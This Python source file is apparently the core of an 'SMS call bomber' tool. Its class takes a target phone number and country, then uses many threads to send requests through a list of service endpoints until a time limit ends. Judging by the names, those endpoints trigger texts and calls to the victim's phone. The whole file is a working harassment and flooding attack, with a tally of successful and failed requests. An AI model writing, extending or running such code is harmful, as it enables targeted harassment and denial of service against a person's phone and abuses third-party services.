import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor
from smscallbomber.service import Service
from smscallbomber.Services import urls
from itertools import cycle
from requests import exceptions 

def get_services(country_code, number):
    services = []
    for service in urls(number):
        if service['info']['country'] == 'ALL' or service['info']['country'] == country_code:
            services.append(service)
    return services

class SMSCallBomber(threading.Thread):
    def __init__(self, args):
        super().__init__()
        self.args = args
        self.services = get_services(self.args.country, self.args.phone)
        self.successful_count = 0
        self.failed_count = 0
        self.running = True

    def run(self):
        with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
            futures = []
            for _ in range(self.args.threads):
                future = executor.submit(self.attack)
                futures.append(future)

            for future in futures:
                future.result()

            self.send_report()

    def attack(self):
        local_successful_count = 0
        local_failed_count = 0
        for service_info in cycle(random.sample(self.services, len(self.services))):
            if time.time() >= self.args.time or not self.running:
                break

            service = Service(service_info, self.args.phone, self.args.timeout)
            try:
                service.send_request()
                local_successful_count += 1
            except exceptions.ReadTimeout:
                local_failed_count += 1
            except exceptions.ConnectTimeout:
                local_failed_count += 1
            except exceptions.ConnectionError:
                local_failed_count += 1
            except Exception as err:
                local_failed_count += 1
            except (KeyboardInterrupt, SystemExit):
                exit()

        self.successful_count += local_successful_count
        self.failed_count += local_failed_count

    def send_report(self):
        return self.successful_count, self.failed_count

    def stop(self):
        self.running = False